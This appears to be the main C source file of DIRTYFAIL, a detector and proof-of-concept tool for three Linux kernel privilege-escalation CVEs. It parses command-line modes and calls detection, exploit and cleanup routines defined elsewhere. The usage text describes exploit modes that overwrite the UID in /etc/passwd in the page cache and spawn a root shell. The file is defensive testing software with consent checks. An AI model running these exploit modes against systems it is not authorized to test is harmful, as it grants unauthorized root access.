/*
 * DIRTYFAIL — main entry point
 *
 * A single binary that detects and (with explicit consent) demonstrates
 * exploitation of:
 *
 *   - Copy Fail            CVE-2026-31431
 *   - Dirty Frag (xfrm-ESP) CVE-2026-43284
 *   - Dirty Frag (RxRPC)    CVE-2026-43500
 *
 * Default mode is detection. The exploit modes never run without
 * --exploit on the command line *and* a typed-string confirmation at
 * runtime.
 *
 * Exit codes:
 *   0  not vulnerable (or: exploit succeeded — semantically "you can
 *      now type `exit` and the test ran")
 *   1  test error / could not determine
 *   2  vulnerable
 *   3  exploit attempted but did not land
 *   4  preconditions not met (effectively "not vulnerable here")
 *   5  exploit succeeded and a root shell was spawned
 */

#include "common.h"
#include "copyfail.h"
#include "dirtyfrag_esp.h"
#include "dirtyfrag_rxrpc.h"

#include <getopt.h>
#include <fcntl.h>

static const char BANNER[] =
"\n"
" ██████╗ ██╗██████╗ ████████╗██╗   ██╗███████╗ █████╗ ██╗██╗      \n"
" ██╔══██╗██║██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔══██╗██║██║      \n"
" ██║  ██║██║██████╔╝   ██║    ╚████╔╝ █████╗  ███████║██║██║      \n"
" ██║  ██║██║██╔══██╗   ██║     ╚██╔╝  ██╔══╝  ██╔══██║██║██║      \n"
" ██████╔╝██║██║  ██║   ██║      ██║   ██║     ██║  ██║██║███████╗ \n"
" ╚═════╝ ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝ \n"
"            Copy Fail + Dirty Frag detector & PoC\n"
"            CVE-2026-31431 / 43284 / 43500\n";

static void usage(const char *prog)
{
    fprintf(stderr,
"Usage: %s [MODE] [OPTIONS]\n"
"\n"
"Modes (pick one; default is --scan):\n"
"  --scan                 detect all three CVEs (no system modification)\n"
"  --check-copyfail       Copy Fail (CVE-2026-31431) detection only\n"
"  --check-esp            Dirty Frag xfrm-ESP (CVE-2026-43284) detection only\n"
"  --check-rxrpc          Dirty Frag RxRPC   (CVE-2026-43500) detection only\n"
"  --exploit-copyfail     real PoC: flip /etc/passwd UID via algif_aead\n"
"  --exploit-esp          real PoC: flip /etc/passwd UID via xfrm-ESP\n"
"  --cleanup              evict /etc/passwd from page cache and drop_caches\n"
"  --version              print version\n"
"  --help                 this message\n"
"\n"
"Options:\n"
"  --no-shell             after a successful exploit, do NOT execve `su`;\n"
"                         instead revert the page-cache patch and exit\n"
"  --no-color             disable ANSI color in output\n"
"\n"
"Exit codes:\n"
"  0 not vulnerable / clean    2 vulnerable     5 exploit succeeded\n"
"  1 test error                3 exploit failed 4 preconditions missing\n"
"\n"
"AUTHORIZED TESTING ONLY. Run only on systems you own or are explicitly\n"
"engaged to assess. The --exploit modes corrupt /etc/passwd in the\n"
"kernel page cache; cleanup with --cleanup or `echo 3 > /proc/sys/vm/drop_caches`.\n",
    prog);
}

enum mode {
    MODE_SCAN,
    MODE_CHECK_COPYFAIL,
    MODE_CHECK_ESP,
    MODE_CHECK_RXRPC,
    MODE_EXPLOIT_COPYFAIL,
    MODE_EXPLOIT_ESP,
    MODE_CLEANUP,
    MODE_HELP,
    MODE_VERSION,
};

#define DIRTYFAIL_VERSION "0.1.0"

int main(int argc, char **argv)
{
    enum mode m       = MODE_SCAN;
    bool      do_shell = true;

    static const struct option opts[] = {
        {"scan",             no_argument, NULL, 'S'},
        {"check-copyfail",   no_argument, NULL,  1 },
        {"check-esp",        no_argument, NULL,  2 },
        {"check-rxrpc",      no_argument, NULL,  3 },
        {"exploit-copyfail", no_argument, NULL,  4 },
        {"exploit-esp",      no_argument, NULL,  5 },
        {"cleanup",          no_argument, NULL,  6 },
        {"no-shell",         no_argument, NULL, 'n'},
        {"no-color",         no_argument, NULL, 'C'},
        {"help",             no_argument, NULL, 'h'},
        {"version",          no_argument, NULL, 'V'},
        {0,0,0,0}
    };

    int c;
    while ((c = getopt_long(argc, argv, "ShVnC", opts, NULL)) != -1) {
        switch (c) {
            case 'S':  m = MODE_SCAN;             break;
            case  1 :  m = MODE_CHECK_COPYFAIL;   break;
            case  2 :  m = MODE_CHECK_ESP;        break;
            case  3 :  m = MODE_CHECK_RXRPC;      break;
            case  4 :  m = MODE_EXPLOIT_COPYFAIL; break;
            case  5 :  m = MODE_EXPLOIT_ESP;      break;
            case  6 :  m = MODE_CLEANUP;          break;
            case 'n':  do_shell = false;          break;
            case 'C':  dirtyfail_use_color = false; break;
            case 'h':  m = MODE_HELP;             break;
            case 'V':  m = MODE_VERSION;          break;
            default :  usage(argv[0]);            return 1;
        }
    }

    if (m == MODE_HELP)    { usage(argv[0]); return 0; }
    if (m == MODE_VERSION) { puts("DIRTYFAIL " DIRTYFAIL_VERSION); return 0; }

    if (dirtyfail_use_color) fputs("\033[1;35m", stdout);
    fputs(BANNER, stdout);
    if (dirtyfail_use_color) fputs("\033[0m", stdout);
    fputc('\n', stdout);

    df_result_t r = DF_OK;

    switch (m) {
    case MODE_SCAN: {
        log_step("running full scan — three detectors\n");

        df_result_t a = copyfail_detect();         fputc('\n', stdout);
        df_result_t b = dirtyfrag_esp_detect();    fputc('\n', stdout);
        df_result_t c2 = dirtyfrag_rxrpc_detect(); fputc('\n', stdout);

        log_step("scan summary:");
        log_hint("  Copy Fail        (CVE-2026-31431): %s",
                 a == DF_VULNERABLE ? "VULNERABLE" :
                 a == DF_PRECOND_FAIL ? "preconditions missing" :
                 a == DF_OK ? "not vulnerable" : "test error");
        log_hint("  Dirty Frag ESP   (CVE-2026-43284): %s",
                 b == DF_VULNERABLE ? "VULNERABLE" :
                 b == DF_PRECOND_FAIL ? "preconditions missing" :
                 b == DF_OK ? "not vulnerable" : "test error");
        log_hint("  Dirty Frag RxRPC (CVE-2026-43500): %s",
                 c2 == DF_VULNERABLE ? "VULNERABLE" :
                 c2 == DF_PRECOND_FAIL ? "preconditions missing" :
                 c2 == DF_OK ? "not vulnerable" : "test error");

        /* aggregate: if any detector says VULNERABLE → exit 2. */
        if (a == DF_VULNERABLE || b == DF_VULNERABLE || c2 == DF_VULNERABLE)
            r = DF_VULNERABLE;
        else if (a == DF_TEST_ERROR || b == DF_TEST_ERROR || c2 == DF_TEST_ERROR)
            r = DF_TEST_ERROR;
        else
            r = DF_OK;
        break;
    }

    case MODE_CHECK_COPYFAIL: r = copyfail_detect();        break;
    case MODE_CHECK_ESP:      r = dirtyfrag_esp_detect();   break;
    case MODE_CHECK_RXRPC:    r = dirtyfrag_rxrpc_detect(); break;

    case MODE_EXPLOIT_COPYFAIL:
        log_warn("running real PoC for Copy Fail (CVE-2026-31431)");
        r = copyfail_exploit(do_shell);
        break;

    case MODE_EXPLOIT_ESP:
        log_warn("running real PoC for Dirty Frag xfrm-ESP (CVE-2026-43284)");
        r = dirtyfrag_esp_exploit(do_shell);
        break;

    case MODE_CLEANUP:
        log_step("evicting /etc/passwd page cache");
        int fd = open("/etc/passwd", O_RDONLY);
        if (fd >= 0) {
#ifdef POSIX_FADV_DONTNEED
            posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
#endif
            close(fd);
        }
        if (geteuid() == 0) {
            log_step("dropping caches (requires root)");
            if (drop_caches()) log_ok("drop_caches OK");
            else log_warn("drop_caches failed: %s", strerror(errno));
        } else {
            log_hint("not root; run `sudo dirtyfail --cleanup` to drop_caches");
        }
        r = DF_OK;
        break;

    default:
        usage(argv[0]);
        return 1;
    }

    return (int)r;
}
